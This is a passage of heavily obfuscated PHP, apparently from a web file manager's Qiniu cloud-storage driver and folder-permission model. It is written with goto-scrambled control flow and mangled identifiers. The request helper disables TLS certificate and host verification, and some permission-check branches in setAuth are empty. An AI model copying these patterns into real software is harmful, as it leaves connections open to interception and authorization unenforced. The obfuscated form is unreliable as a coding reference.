isFile($b›Õà†±ëù) { list($bÃ∆®¡∫Üà, $CÒŸêÖ⁄ãﬁ) = $this->bucketManager->stat($this->bucket, trim($b›Õà†±ëù, $_SERVER[∞„˜ƒÑºª][8])); return $CÒŸêÖ⁄ãﬁ ? !1 : !0; } public function isFolder($e◊Õ⁄îÿ˜‘) { goto eÇèßÖ∑ì‡; eÇèßÖ∑ì‡: $cïõ…ä¨—é =& $_SERVER[∞„˜ƒÑºª]; $DåÖÎ£‡»ê = trim($e◊Õ⁄îÿ˜‘, $cïõ…ä¨—é[8]); if (empty($DåÖÎ£‡»ê)) { return !0; } goto A∞®á⁄àöÜ; Dîø¯û‰È©: $D˜Ÿéâü»∂ = $cïõ…ä¨—é[8]; list($AíÕ◊ÜªŸã, $AÃ˘â‹ éï) = $this->bucketManager->listFiles($this->bucket, $Eëÿ˜Æâáˆ, $eåù¯∆«¿ä, $E±”∞ùŒõ¶, $D˜Ÿéâü»∂); if (!empty($AíÕ◊ÜªŸã[$cïõ…ä¨—é[924]]) || !empty($AíÕ◊ÜªŸã[$cïõ…ä¨—é[927]])) { return !0; } goto c◊éøåßê›; A∞®á⁄àöÜ: $Eëÿ˜Æâáˆ = trim($e◊Õ⁄îÿ˜‘, $cïõ…ä¨—é[8]) . $cïõ…ä¨—é[8]; $eåù¯∆«¿ä = $cïõ…ä¨—é[33]; $E±”∞ùŒõ¶ = 1; goto Dîø¯û‰È©; c◊éøåßê›: return !1; goto aì∏Ãü∆åﬁ; aì∏Ãü∆åﬁ: } public function listPath($Dó Ÿÿöé–, $d¥áÜƒÁΩ = false, $C∏ƒïæ–úÁ = false) { goto eçÂﬁ≥ÑÚˆ; B‹´Ö»ëÉå: $C£®Ïú“Ê« = $AòﬁÔëöª[33]; $bßˆ€√â˘û = 1000; $Béï´Ò®‘ÿ = $AòﬁÔëöª[8]; goto a–Ûá¯Ç≥á; eçÂﬁ≥ÑÚˆ: $AòﬁÔëöª =& $_SERVER[∞„˜ƒÑºª]; $Dó Ÿÿöé– = trim($Dó Ÿÿöé–, $AòﬁÔëöª[8]); $D‡‰éÉ‹É÷ = empty($Dó Ÿÿöé–) ? $AòﬁÔëöª[33] : $Dó Ÿÿöé– . $AòﬁÔëöª[8]; goto B‹´Ö»ëÉå; a–Ûá¯Ç≥á: $e„ç•òö¶“ = $CœÖåÊóÎÖ = array(); while (!0) { list($aª©¿ù˜õ˜, $b‡Íı‹Œûì) = $this->bucketManager->listFiles($this->bucket, $D‡‰éÉ‹É÷, $C£®Ïú“Ê«, $bßˆ€√â˘û, $Béï´Ò®‘ÿ); if ($b‡Íı‹Œûì) { return !1; } $C£®Ïú“Ê« = array_key_exists($AòﬁÔëöª[890], $aª©¿ù˜õ˜) ? $C£®Ïú“Ê« = $aª©¿ù˜õ˜[$AòﬁÔëöª[923]] : $AòﬁÔëöª[33]; if (isset($aª©¿ù˜õ˜[$AòﬁÔëöª[927]])) { foreach ($aª©¿ù˜õ˜[$AòﬁÔëöª[927]] as $fõ‚ú÷‘•ã) { if ($fõ‚ú÷‘•ã == $D‡‰éÉ‹É÷) { continue; } $e„ç•òö¶“[] = $this->folderInfo($fõ‚ú÷‘•ã, $d¥áÜƒÁΩ, $C∏ƒïæ–úÁ); } } if (isset($aª©¿ù˜õ˜[$AòﬁÔëöª[924]])) { foreach ($aª©¿ù˜õ˜[$AòﬁÔëöª[924]] as $Cˆç†ÑÊÛ›) { if ($Cˆç†ÑÊÛ›[$AòﬁÔëöª[96]] == $D‡‰éÉ‹É÷) { continue; } $CœÖåÊóÎÖ[] = $this->fileInfo($Cˆç†ÑÊÛ›[$AòﬁÔëöª[96]], $Cˆç†ÑÊÛ›, $C∏ƒïæ–úÁ); } } if ($C£®Ïú“Ê« == $AòﬁÔëöª[33]) { break; } } return array($AòﬁÔëöª[83] => $e„ç•òö¶“, $AòﬁÔëöª[82] => $CœÖåÊóÎÖ); goto aªñŸ§‰Ï—; aªñŸ§‰Ï—: } public function has($d‹†ñ»òÍÇ, $e∫‚ì“‡Çá = true) { goto a¯ÒãàâûÜ; a¯ÒãàâûÜ: $B≥∂•òúö¿ =& $_SERVER[∞„˜ƒÑºª]; $d‹†ñ»òÍÇ = trim($d‹†ñ»òÍÇ, $B≥∂•òúö¿[8]); $cá∂≈≠Î—Ó = empty($d‹†ñ»òÍÇ) ? $B≥∂•òúö¿[33] : $d‹†ñ»òÍÇ . $B≥∂•òúö¿[8]; goto aıÕ»ûÙÜ∫; aıÕ»ûÙÜ∫: $DÃ∫´Ó•‚— = $B≥∂•òúö¿[33]; $B…ƒõ ≤¬Ü = 100; $E˜àÖã§åı = $B≥∂•òúö¿[8]; goto F¡‰ÃÇÿ◊Ø; F¡‰ÃÇÿ◊Ø: while (!0) { list($B°—ú¥éºÍ, $EÏ—„”îô) = $this->bucketManager->listFiles($this->bucket, $cá∂≈≠Î—Ó, $DÃ∫´Ó•‚—, $B…ƒõ ≤¬Ü, $E˜àÖã§åı); if ($EÏ—„”îô) { return !1; } $DÃ∫´Ó•‚— = array_key_exists($B≥∂•òúö¿[890], $B°—ú¥éºÍ) ? $DÃ∫´Ó•‚— = $B°—ú¥éºÍ[$B≥∂•òúö¿[923]] : $B≥∂•òúö¿[33]; if ($e∫‚ì“‡Çá) { if (!empty($B°—ú¥éºÍ[$B≥∂•òúö¿[924]])) { return !0; } } else { if (!empty($B°—ú¥éºÍ[$B≥∂•òúö¿[927]])) { return !0; } } if ($DÃ∫´Ó•‚— == $B≥∂•òúö¿[33]) { break; } } return !1; goto AÎ—Ó€§é‘; AÎ—Ó€§é‘: } public function listAll($d≈üå‹˜Ññ) { $Fƒ§ÑåìÇ¨ =& $_SERVER[∞„˜ƒÑºª]; $fïÎ•äåÉ¨ = $this->fileList($d≈üå‹˜Ññ, 1); $bîÑçÉﬁÒà = array(); foreach ($fïÎ•äåÉ¨ as $B∂áçéé«Ã) { $bîÑçÉﬁÒà[$B∂áçéé«Ã[$Fƒ§ÑåìÇ¨[28]]] = $B∂áçéé«Ã[$Fƒ§ÑåìÇ¨[86]]; } return $this->listAllFiles($d≈üå‹˜Ññ, array_keys($bîÑçÉﬁÒà), $bîÑçÉﬁÒà); } public function canRead($dáÌ◊√€Ñ) { return $this->exist($dáÌ◊√€Ñ) ? !0 : !1; } public function canWrite($DÊ›€º‹´û) { return $this->exist($DÊ›€º‹´û) ? !0 : !1; } public function getContent($BêÑ¯…åÑπ) { return $this->fileSubstr($BêÑ¯…åÑπ, 0, -1); } public function setContent($Fª∞òö¨ÂÙ, $féÜÑ”ãÂñ = '') { $Câ≤êåΩ±´ = $this->tempFile($this->pathThis($Fª∞òö¨ÂÙ)); file_put_contents($Câ≤êåΩ±´, $féÜÑ”ãÂñ); if ($this->upload($Fª∞òö¨ÂÙ, $Câ≤êåΩ±´)) { $this->tempFileRemve($Câ≤êåΩ±´); return !0; } return !1; } public function refreshUrls($F˜¡Ù°ÜÂ) { goto aºó•≤éîè; dä¿Ú“™êÓ: return $CÜò–ˆæƒÂ[$dÉ ¶Ïïœè[928]] == $dÉ ¶Ïïœè[452] ? !0 : !1; goto B›Çƒ∆¿Â∆; aºó•≤éîè: $dÉ ¶Ïïœè =& $_SERVER[∞„˜ƒÑºª]; $DÙô÷¡´¨ú = array(); if (is_array($F˜¡Ù°ÜÂ)) { foreach ($F˜¡Ù°ÜÂ as $DòÏàã≈Ω») { $DÙô÷¡´¨ú[] = $this->link($DòÏàã≈Ω»); } } else { $DÙô÷¡´¨ú[] = $this->link($F˜¡Ù°ÜÂ); } goto fı⁄îçà©î; fı⁄îçà©î: $F•©èÀÇ¨› = new Qiniu\Cdn\CdnManager($this->auth); list($CÜò–ˆæƒÂ, $a‡–†ÇëÚŸ) = $F•©èÀÇ¨›->refreshUrls($DÙô÷¡´¨ú); if ($a‡–†ÇëÚŸ) { return !1; } goto dä¿Ú“™êÓ; B›Çƒ∆¿Â∆: } public function fileSubstr($aπÚ∏çÛ⁄Ã, $BÖá’◊Œ®Ò, $bÛŒàãúŸ¥) { $EŒ€¬“è’± =& $_SERVER[∞„˜ƒÑºª]; if (!($AÑ‰ÈÖÇ¡Ñ = $this->link($aπÚ∏çÛ⁄Ã))) { return !1; } $c≈–Âò£äû = array($EŒ€¬“è’±[893] => $BÖá’◊Œ®Ò, $EŒ€¬“è’±[324] => $bÛŒàãúŸ¥); return $this->qnRequest($AÑ‰ÈÖÇ¡Ñ, $c≈–Âò£äû); } public function upload($CÀÉ‹ê‹åà, $CÖﬂ£—†÷Æ, $Fã ‚Õ¨¢ƒ = false, $C±ÁÍéﬂí˜ = REPEAT_REPLACE) { $Aä∞´î’•é = new Qiniu\Storage\UploadManager(); $Bê¯·æÖÒ§ = $this->auth->uploadToken($this->bucket, $CÀÉ‹ê‹åà); $Cûúé◊ö®Ÿ = get_file_mime(get_path_ext($Aé¿œíÉ∏Æ)); list($C§ÉÿëµÔö, $báÚÀ…òÈ∏) = $Aä∞´î’•é->putFile($Bê¯·æÖÒ§, $CÀÉ‹ê‹åà, $CÖﬂ£—†÷Æ, null, $Cûúé◊ö®Ÿ); return $báÚÀ…òÈ∏ ? !1 : $this->getPathOuter($CÀÉ‹ê‹åà); } public function getHost($B◊Œà”≤Ëõ = true) { $c©ïêõ…È“ =& $_SERVER[∞„˜ƒÑºª]; $B¨…Ï¥ÏÔΩ = parse_url(trim($this->domain, $c©ïêõ…È“[8])); $Bíô©ÒÚõä = isset($B¨…Ï¥ÏÔΩ[$c©ïêõ…È“[164]]) ? $B¨…Ï¥ÏÔΩ[$c©ïêõ…È“[164]] : http_type(); $a•œ“›”ú∏ = isset($B¨…Ï¥ÏÔΩ[$c©ïêõ…È“[165]]) ? $B¨…Ï¥ÏÔΩ[$c©ïêõ…È“[165]] : $B¨…Ï¥ÏÔΩ[$c©ïêõ…È“[84]]; if (isset($B¨…Ï¥ÏÔΩ[$c©ïêõ…È“[166]])) { $a•œ“›”ú∏ .= $c©ïêõ…È“[4] . $B¨…Ï¥ÏÔΩ[$c©ïêõ…È“[166]]; } return $Bíô©ÒÚõä . $c©ïêõ…È“[167] . $a•œ“›”ú∏; } public function uploadFormData($dÑ†¨Ê¥·å, $C†©÷ÁõÒ¥ = 3600) { return $this->uploadToken($dÑ†¨Ê¥·å, $C†©÷ÁõÒ¥); } public function multiUploadFormData($aŒÙáıŒ¬´, $D†ùÇ‹ÂÆ¿ = 3600) { return $this->uploadToken($aŒÙáıŒ¬´, $D†ùÇ‹ÂÆ¿); } private function uploadToken($E¡ú–ä›»ó, $AˆÚáûöè“ = 3600) { goto bäüÒœ•ì„; bäüÒœ•ì„: $F»ã·¡çÉ€ =& $_SERVER[∞„˜ƒÑºª]; $dÏ†Ω≠Ñ≠© = $AˆÚáûöè“; $dÒ¨ø“Ì∫ı = array($F»ã·¡çÉ€[929] => $F»ã·¡çÉ€[930]); goto f◊ßäÀ·∞û; f◊ßäÀ·∞û: $CÕ„©·ıúõ = null; $aÈßÜÑàª– = $this->auth->uploadToken($this->bucket, $CÕ„©·ıúõ, $dÏ†Ω≠Ñ≠©, $dÒ¨ø“Ì∫ı, !0); $F‡…ÜË⁄¨ã = empty($this->region) || $this->region == $F»ã·¡çÉ€[931] ? $F»ã·¡çÉ€[33] : $F»ã·¡çÉ€[497] . $this->region; goto DÎ∏éó∑Ü⁄; DÎ∏éó∑Ü⁄: $FåÛ∫Œ≈ﬁ˘ = http_type() . "\x3a\x2f\x2f\165\x70\154\157\x61\x64{$F‡…ÜË⁄¨ã}\56\x71\x69\x6e\x69\165\160\x2e\x63\157\155\x2f"; return array($F»ã·¡çÉ€[932] => $aÈßÜÑàª–, $F»ã·¡çÉ€[933] => $FåÛ∫Œ≈ﬁ˘); goto c’ÓœÎ“©ˆ; c’ÓœÎ“©ˆ: } public function download($dçé◊·Æò∑, $aÙÉº›©íñ) { goto FΩêΩæúÑÿ; FèΩª•˘ú : $E§£ÌìÿÛß = 0; $F˘ªöı◊€œ = 1024 * 200; $b∂§çñ◊ı˘ = fopen($FËä‹ª¶Ì∑, $Bé¡÷Í∫«ƒ[934]); goto cÃ„†ÿ≤≤«; FΩêΩæúÑÿ: $Bé¡÷Í∫«ƒ =& $_SERVER[∞„˜ƒÑºª]; $FËä‹ª¶Ì∑ = IO::getPathInner(IO::mkfile($aÙÉº›©íñ)); if (!($Eê§«©â¡ﬁ = $this->link($dçé◊·Æò∑))) { return !1; } goto FèΩª•˘ú ; cÃ„†ÿ≤≤«: while (!0) { $e¶òŒå£¬≥ = array($Bé¡÷Í∫«ƒ[893] => $E§£ÌìÿÛß, $Bé¡÷Í∫«ƒ[324] => $F˘ªöı◊€œ); $EÖÂ¢¥Ωüˆ = $this->qnRequest($Eê§«©â¡ﬁ, $e¶òŒå£¬≥); if ($E§£ÌìÿÛß && ($E≈Àë„œ—Â = @json_decode($EÖÂ¢¥Ωüˆ, !0))) { if (isset($E≈Àë„œ—Â[$Bé¡÷Í∫«ƒ[928]])) { return !1; } } fwrite($b∂§çñ◊ı˘, $EÖÂ¢¥Ωüˆ); $E§£ÌìÿÛß += $F˘ªöı◊€œ; if (strlen($EÖÂ¢¥Ωüˆ) < $F˘ªöı◊€œ) { break; } } fclose($b∂§çñ◊ı˘); return $aÙÉº›©íñ; goto f±™ªƒ Ç‘; f±™ªƒ Ç‘: } public function link($A∏‡àÀﬁñô, $D¬À‹êæÖ™ = '') { if (!$this->isFile($A∏‡àÀﬁñô)) { return !1; } $d†…¿ßªœ— = $this->getHost() . $_SERVER[∞„˜ƒÑºª][8] . $this->pathEncode($A∏‡àÀﬁñô) . $D¬À‹êæÖ™; return $this->auth->privateDownloadUrl($d†…¿ßªœ—, 3600 * 12); } public function fileOut($E©À£ÉÙ˜è, $C¨≥≠¨±éª = false, $aøŸÚÎÆ™™ = false, $AîÑã€Ÿº‘ = '') { $BÉ Ô∂åÜ° =& $_SERVER[∞„˜ƒÑºª]; if (!$aøŸÚÎÆ™™) { $aøŸÚÎÆ™™ = $this->pathThis($E©À£ÉÙ˜è); } $a¶‡ÚäÕÃ” = $C¨≥≠¨±éª ? $BÉ Ô∂åÜ°[935] . rawurlencode($aøŸÚÎÆ™™) : $BÉ Ô∂åÜ°[33]; $dÔ÷ÿß Àõ = $this->link($E©À£ÉÙ˜è, $a¶‡ÚäÕÃ”); $this->fileOutLink($dÔ÷ÿß Àõ); } public function fileOutServer($dÆÚï£¶≥Ú, $B±¬¡øƒ≈ä = false, $cÉﬂ√ÕÂñë = false, $e€≤é…ö∂ú = '') { parent::fileOut($dÆÚï£¶≥Ú, $B±¬¡øƒ≈ä, $cÉﬂ√ÕÂñë, $e€≤é…ö∂ú); } public function fileOutImage($aåé«Õö¡†, $c©Éöÿâ§Û = 250) { $bÈﬁ¥ìë·∞ = $this->link($aåé«Õö¡†, $_SERVER[∞„˜ƒÑºª][936] . $c©Éöÿâ§Û); $this->fileOutLink($bÈﬁ¥ìë·∞); } public function fileOutImageServer($fÏ¿™•«∞í, $d…˘ªÕÇÃè = 250) { parent::fileOutImage($fÏ¿™•«∞í, $d…˘ªÕÇÃè); } public function fileOutLink($C¯í‰‡ı„‰) { header($_SERVER[∞„˜ƒÑºª][154] . $C¯í‰‡ı„‰); die; } public function hashMd5($f‡ÌË µΩï) { $Cú€ã¶ÉÈÒ =& $_SERVER[∞„˜ƒÑºª]; $bﬂªó‹éÁë = $this->link($f‡ÌË µΩï, $Cú€ã¶ÉÈÒ[937]); $Døå£¡™åº = $this->qnRequest($bﬂªó‹éÁë, array(), !0); return !isset($Døå£¡™åº[$Cú€ã¶ÉÈÒ[193]]) ? !1 : $Døå£¡™åº[$Cú€ã¶ÉÈÒ[193]]; } private function fileInfoImage($fòÎ≈©˜Àœ, &$cœ±ç˘Ç®€) { $aá…ë’£∑± =& $_SERVER[∞„˜ƒÑºª]; if (!in_array($cœ±ç˘Ç®€[$aá…ë’£∑±[156]], array($aá…ë’£∑±[204], $aá…ë’£∑±[157], $aá…ë’£∑±[205], $aá…ë’£∑±[206], $aá…ë’£∑±[207]))) { return; } if (!($f≠æâÀ∆©∫ = $this->link($fòÎ≈©˜Àœ, $aá…ë’£∑±[938]))) { return !1; } if (!($Dˆæ„äåìç = $this->qnRequest($f≠æâÀ∆©∫, array(), !0))) { return !1; } $cœ±ç˘Ç®€[$aá…ë’£∑±[208]] = array($aá…ë’£∑±[209] => $Dˆæ„äåìç[$aá…ë’£∑±[209]], $aá…ë’£∑±[874] => $Dˆæ„äåìç[$aá…ë’£∑±[210]]); } public function qnRequest($e⁄àå¿Ωäö, $EÈ«É·°◊— = array(), $bö∑Ãì†ûï = false) { goto F ºå Íπµ; F ºå Íπµ: $cá∏á¥ı©Ó =& $_SERVER[∞„˜ƒÑºª]; $aªﬂøÑπ’Á = curl_init(); curl_setopt($aªﬂøÑπ’Á, CURLOPT_URL, $e⁄àå¿Ωäö); goto cÑèÖ‹¬öâ; cÑèÖ‹¬öâ: curl_setopt($aªﬂøÑπ’Á, CURLOPT_RETURNTRANSFER, 1); curl_setopt($aªﬂøÑπ’Á, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($aªﬂøÑπ’Á, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto cÚ≥‘éè≥π; FƒèÌîπ¶„: curl_setopt($aªﬂøÑπ’Á, CURLOPT_FOLLOWLOCATION, 1); $f«Ø¨íŸ≥ﬁ = curl_exec($aªﬂøÑπ’Á); curl_progress_end($aªﬂøÑπ’Á); goto aäôÉÛ∞ß¿; aäôÉÛ∞ß¿: curl_close($aªﬂøÑπ’Á); if ($bö∑Ãì†ûï) { return @json_decode($f«Ø¨íŸ≥ﬁ, !0); } return $f«Ø¨íŸ≥ﬁ; goto EŸ‡≤È◊–¨; cÚ≥‘éè≥π: curl_setopt($aªﬂøÑπ’Á, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($aªﬂøÑπ’Á, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($aªﬂøÑπ’Á, CURLOPT_NOPROGRESS, !1); goto B‹ª‡ä»π∂; B‹ª‡ä»π∂: curl_setopt($aªﬂøÑπ’Á, CURLOPT_PROGRESSFUNCTION, $cá∏á¥ı©Ó[939]); curl_progress_start($aªﬂøÑπ’Á); if (isset($EÈ«É·°◊—[$cá∏á¥ı©Ó[893]]) && $EÈ«É·°◊—[$cá∏á¥ı©Ó[324]] > 0) { $cö≈—ÏéËä = $EÈ«É·°◊—[$cá∏á¥ı©Ó[893]]; $EﬂıÕÒÀÌ® = $EÈ«É·°◊—[$cá∏á¥ı©Ó[893]] + ($EÈ«É·°◊—[$cá∏á¥ı©Ó[324]] - 1); curl_setopt($aªﬂøÑπ’Á, CURLOPT_RANGE, "{$cö≈—ÏéËä}\x2d{$EﬂıÕÒÀÌ®}"); } goto FƒèÌîπ¶„; EŸ‡≤È◊–¨: } } goto cÑı∫ﬁ•èÛ; Aº’ø«á¥¿: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\x63\145\137\141\165\x74\x68"; public function getAuth($f»À†¨ïÁŒ) { goto A◊÷ÂóΩöõ; Fı·‡®·œ“: return $Aı√πéàÁ¶; goto a»°°è›»¯; EÚƒÂ∂Ë◊ç: $e°Ì∂ãƒéπ = $this->field($d≥Øô¿˜àã)->order($cÆ åÑ¯ﬂç[366])->where($dµ¡ÿ’öÜ≤)->select(); $Aı√πéàÁ¶ = array(); foreach ($e°Ì∂ãƒéπ as $Cö·≥πﬁã∫) { if (Model($cÆ åÑ¯ﬂç[1658])->listData($Cö·≥πﬁã∫[$cÆ åÑ¯ﬂç[1652]])) { $Aı√πéàÁ¶[] = $Cö·≥πﬁã∫; } } goto Fı·‡®·œ“; A◊÷ÂóΩöõ: $cÆ åÑ¯ﬂç =& $_SERVER[∞„˜ƒÑºª]; $d≥Øô¿˜àã = $cÆ åÑ¯ﬂç[1657]; $dµ¡ÿ’öÜ≤ = array($cÆ åÑ¯ﬂç[374] => $f»À†¨ïÁŒ); goto EÚƒÂ∂Ë◊ç; a»°°è›»¯: } public function setAuth($e¡¨ƒÓÉä∞, $Cá°ì¥É“) { goto Bî◊ÇÌó¯ı; Bî◊ÇÌó¯ı: $aâ”‡˜êí€ =& $_SERVER[∞„˜ƒÑºª]; $F¨ï•àü∂é = Model($aâ”‡˜êí€[832])->sourceInfo($e¡¨ƒÓÉä∞); if ($F¨ï•àü∂é[$aâ”‡˜êí€[393]] != SourceModel::TYPE_GROUP) { return !1; } goto cäÀ¥‘¬êÖ; cäÀ¥‘¬êÖ: $cë◊ŒÔ®Ï = 1; $Aö€ŸÚ”ä = $F¨ï•àü∂é[$aâ”‡˜êí€[395]]; if ($Aö€ŸÚ”ä != $cë◊ŒÔ®Ï) { $eûﬂ°°ÇÔî = array($aâ”‡˜êí€[1516] => $Aö€ŸÚ”ä); $cª‚±ÛÓÏô = Model($aâ”‡˜êí€[1600])->field($aâ”‡˜êí€[1063])->where($eûﬂ°°ÇÔî)->select(); $cª‚±ÛÓÏô = array_to_keyvalue($cª‚±ÛÓÏô, $aâ”‡˜êí€[33], $aâ”‡˜êí€[1063]); } goto fûÁê¯ÁÀì; fûÁê¯ÁÀì: $BÔ…‚¢£‹≠ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Eà·—¶Ç—å = array(); foreach ($Cá°ì¥É“ as $f±äçç™™≥) { if (!in_array($f±äçç™™≥[$aâ”‡˜êí€[393]], $BÔ…‚¢£‹≠)) { show_json(LNG($aâ”‡˜êí€[1659]), !1); } if ($Aö€ŸÚ”ä != $cë◊ŒÔ®Ï) { if ($f±äçç™™≥[$aâ”‡˜êí€[393]] == SourceModel::TYPE_GROUP) { } if ($f±äçç™™≥[$aâ”‡˜êí€[395]] != 0 && !in_array($f±äçç™™≥[$aâ”‡˜êí€[395]], $cª‚±ÛÓÏô)) { } } if ($f±äçç™™≥[$aâ”‡˜êí€[395]] == 0) { $f±äçç™™≥[$aâ”‡˜êí€[393]] = SourceModel::TYPE_USER; } $Eà·—¶Ç—å[] = array($aâ”‡˜êí€[374] => $e¡¨ƒÓÉä∞, $aâ”‡˜êí€[393] => intval($f±äçç™™≥[$aâ”‡˜êí€[393]]), $aâ”‡˜êí€[395] => intval($f±äçç™™≥[$aâ”‡˜êí€[395]]), $aâ”‡˜êí€[1652] => intval($f±äçç™™≥[$aâ”‡˜êí€[1652]]) ? intval($f±äçç™™≥[$aâ”‡˜êí€[1652]]) : 0, $aâ”‡˜êí€[1653] => intval($f±äçç™™≥[$aâ”‡˜êí€[1653]]) ? intval($f±äçç™™≥[$aâ”‡˜êí€[1653]]) : -1); } goto Cï–œˆﬁƒŸ; Cï–œˆﬁƒŸ: $this->where(array($aâ”‡˜êí€[414] => $e¡¨ƒÓÉä∞))->delete(); $this->addAll($Eà·—¶Ç—å); return !0; goto Cè⁄ÕÛ‰è£; Cè⁄ÕÛ‰è£: } public function authClear($cêâÍ∆«ØÙ) { $e¶…ΩÈÁü¨ =& $_SERVER[∞„˜ƒÑºª]; $bçàí Õ¿‹ = Model($e¶…ΩÈÁü¨[832])->sourceInfo($cêâÍ∆«ØÙ); $A€¬Æª’È˘ = array($cêâÍ∆«ØÙ); if ($bçàí Õ¿‹[$e¶…ΩÈÁü¨[375]] == $e¶…ΩÈÁü¨[376]) { $B—ñÑœπ•¡ = array($e¶…ΩÈÁü¨[399] => array($e¶…ΩÈÁü¨[408], $bçàí Õ¿‹[$e¶…ΩÈÁü¨[373]] . $cêâÍ∆«ØÙ . $e¶…ΩÈÁü¨[409])); $A€¬Æª’È˘ = Model($e¶…ΩÈÁü¨[832])->field($e¶…ΩÈÁü¨[414])->where($B—ñÑœπ•¡)->getField($e¶…ΩÈÁü¨[374], !0); $A€¬Æª’È˘[] = $cêâÍ∆«ØÙ; } $this->where(array($e¶…ΩÈÁü¨[414] => array($e¶…ΩÈÁü¨[951], $A€¬Æª’È˘)))->delete(); return !0; } public function get($a’„ØâÕﬂˆ) { $fåâ¯ÛÈÓ° = $this->getSourceList(array($a’„ØâÕﬂˆ), !0); return $fåâ¯ÛÈÓ°[0]; } public function getSourceList($E√∑œë›‘”, $EÕòá‘„›¨ = false) { goto EÖüÔ¿ﬂó¬; eâõµœ¡¡Ÿ: $cÊçáÉùÒ… = array($eç£ÈÉ◊àé[414] => array($eç£ÈÉ◊àé[951], $D“Î‹ó∫¯á)); $eëé√“≠ç = $this->field($A√ØÇÖïñ◊)->where($cÊçáÉùÒ…)->select(); $eëé√“≠ç = array_to_keyvalue_group($eëé√“≠ç, $eç£ÈÉ◊àé[374]); goto FÛç´ãò◊ò; FÛç´ãò◊ò: $D‰é™Œ€Ñ„ = array(); foreach ($EÕòá‘„›¨ as $Dºª©ûÓãÿ => $F¢äÕ¬¥éô) { $D‰é™Œ€Ñ„[$Dºª©ûÓãÿ] = $this->makeSourceAuth($F¢äÕ¬¥éô, $eëé√“≠ç); } return $D‰é™Œ€Ñ„; goto Aäñ™©‚Ñ…; EÖüÔ¿ﬂó¬: $eç£ÈÉ◊àé =& $_SERVER[∞„˜ƒÑºª]; if (!$E√∑œë›‘”) { return array(); } $a¬Ú„ñ◊«œ = Model($eç£ÈÉ◊àé[832]); goto fºàÎñÉ÷Í; fºàÎñÉ÷Í: if (!$EÕòá‘„›¨) { $cÊçáÉùÒ… = array($eç£ÈÉ◊àé[414] => array($eç£ÈÉ◊àé[951], $E√∑œë›‘”)); $EÕòá‘„›¨ = $a¬Ú„ñ◊«œ->field($eç£ÈÉ◊àé[1660])->where($cÊçáÉùÒ…)->select(); $EÕòá‘„›¨ = array_to_keyvalue($EÕòá‘„›¨, $eç£ÈÉ◊àé[374]); } $D“Î‹ó∫¯á = $E√∑œë›‘”; foreach ($EÕòá‘„›¨ as $c…ö√¿‡À÷ => $câ“∞∫Ãá÷) { $dΩ§”À¯ ∫ = $a¬Ú„ñ◊«œ->parentLevelArray($câ“∞∫Ãá÷[$eç£ÈÉ◊àé[373]]); $D“Î‹ó∫¯á = array_merge($D“Î‹ó∫¯á, $dΩ§”À¯ ∫, array($c…ö√¿‡À÷)); } goto Eçïü©êÖ§; Eçïü©êÖ§: $D“Î‹ó∫¯á = array_values(array_unique($D“Î‹ó∫¯á)); if (!$D“Î‹ó∫¯á) { return array(); } $A√ØÇÖïñ◊ = $eç£ÈÉ◊àé[1661]; goto eâõµœ¡¡Ÿ; Aäñ™©‚Ñ…: } public function authDeepCheck($B˜ÑßãëÏ‰, $CÚ⁄≈¨É°Ö = false) { $C‡ó˜Œöøº =& $_SERVER[∞„˜ƒÑºª]; if ($GLOBALS[$C‡ó˜Œöøº[998]]) { return !1; } $fÇ‰Ÿ∆È∏í = $this->makeAuthDeep(); if (!in_array($B˜ÑßãëÏ‰, $fÇ‰Ÿ∆È∏í)) { return !1; } return array($C‡ó˜Œöøº[1662] => -1, $C‡ó˜Œöøº[1663] => array($C‡ó˜Œöøº[794] => $C‡ó˜Œöøº[761], $C‡ó˜Œöøº[1522] => $C‡ó˜Œöøº[402], $C‡ó˜Œöøº[387] => LNG($C‡ó˜Œöøº[1664]), $C‡ó˜Œöøº[1534] => $C‡ó˜Œöøº[1665])); } protected function makeAuthDeep() { goto c›°≥¨«Ù; BÍîˆˆ»–—: $Eﬂñä∞îÊö = Session::get($Dõ©—çî¥‘[1636]); $Eﬂñä∞îÊö = array_to_keyvalue($Eﬂñä∞îÊö, $Dõ©—çî¥‘[33], $Dõ©—çî¥‘[1516]); $F¯••ä„π¥ = array($Dõ©—çî¥‘[393] => SourceModel::TYPE_USER, $Dõ©—çî¥‘[395] => USER_ID); goto aΩéæ»—ú¢; E¿µç∞ªﬂ£: $e…â€…¨©ø = array_to_keyvalue($cøú“°Îã∆, $Dõ©—çî¥‘[33], $Dõ©—çî¥‘[374]); $f¢⁄Êû›¯≥ = array(); $a”˜∑Æ±›å = $Eﬂñä∞îÊö; goto DÜ«Îß†Œˆ; Bâñ„«Ïä¬: $Dê·êﬁƒã = Model($Dõ©—çî¥‘[1666])->listData(); $FÂÏÖ‡›ı† = array(); foreach ($Dê·êﬁƒã as $d¡…ËäàÆË) { if ($d¡…ËäàÆË[$Dõ©—çî¥‘[548]] == 0 && $d¡…ËäàÆË[$Dõ©—çî¥‘[1536]] == $Dõ©—çî¥‘[376]) { $FÂÏÖ‡›ı†[] = $d¡…ËäàÆË[$Dõ©—çî¥‘[366]]; } } goto BÍîˆˆ»–—; DÜ«Îß†Œˆ: $C·º≠∫áçÚ = Model($Dõ©—çî¥‘[832]); $f¬ÀüÛÇäå = Model($Dõ©—çî¥‘[1669]); if ($e…â€…¨©ø) { $a–€ØáŸñÚ = $C·º≠∫áçÚ->where(array($Dõ©—çî¥‘[374] => array($Dõ©—çî¥‘[951], $e…â€…¨©ø)))->select(); foreach ($a–€ØáŸñÚ as $B’Ñô“®À∞) { $c⁄Éâ£¨æå = $C·º≠∫áçÚ->parentLevelArray($B’Ñô“®À∞[$Dõ©—çî¥‘[373]]); $f¢⁄Êû›¯≥ = array_merge($f¢⁄Êû›¯≥, $c⁄Éâ£¨æå); $a”˜∑Æ±›å[] = $B’Ñô“®À∞[$Dõ©—çî¥‘[395]]; } } goto B≈ª˜Ç„Øà; c›°≥¨«Ù: $Dõ©—çî¥‘ =& $_SERVER[∞„˜ƒÑºª]; static $f¢⁄Êû›¯≥ = false; if ($f¢⁄Êû›¯≥) { return $f¢⁄Êû›¯≥; } goto Bâñ„«Ïä¬; fÖ‰ÃÛ–õÔ: return $f¢⁄Êû›¯≥; goto b≈ê˜≤◊ü˜; AÒﬁ±Ωä¶µ: $a”˜∑Æ±›å = array_values(array_unique($a”˜∑Æ±›å)); foreach 